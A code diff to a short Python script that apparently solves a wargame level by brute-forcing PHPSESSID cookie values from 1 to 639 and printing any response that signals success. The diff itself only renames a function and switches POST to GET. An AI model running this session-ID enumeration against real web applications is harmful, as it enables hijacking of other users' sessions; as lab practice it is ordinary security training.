@@ -21,12 +21,12 @@ def get_authentication_credentials() -> tuple[str, str]:
     password = getpass.getpass(prompt=f'Enter password for {LEVEL_CURRENT}: ')
     return LEVEL_CURRENT, password
 
-def send_post_request(credentials: tuple[str, str], cookies: dict[str, str]) -> str:
+def send_request(credentials: tuple[str, str], cookies: dict[str, str]) -> str:
     """
-    Sends a POST request with the given authentication and cookies.
+    Sends a request with the given authentication and cookies.
     Returns the response text or raises an exception on failure.
     """
-    response = requests.post(URL, auth=credentials, cookies=cookies)
+    response = requests.get(URL, auth=credentials, cookies=cookies)
     response.raise_for_status()
 
     return response
@@ -42,7 +42,7 @@ def main():
 
     for id in range(1, 640):
         print(f'Trying PHPSESSID={ id }')
-        response = send_post_request(credentials, { "PHPSESSID": str(id) })
+        response = send_request(credentials, { "PHPSESSID": str(id) })
 
         if response_indicates_success(response):
             print(response.text)
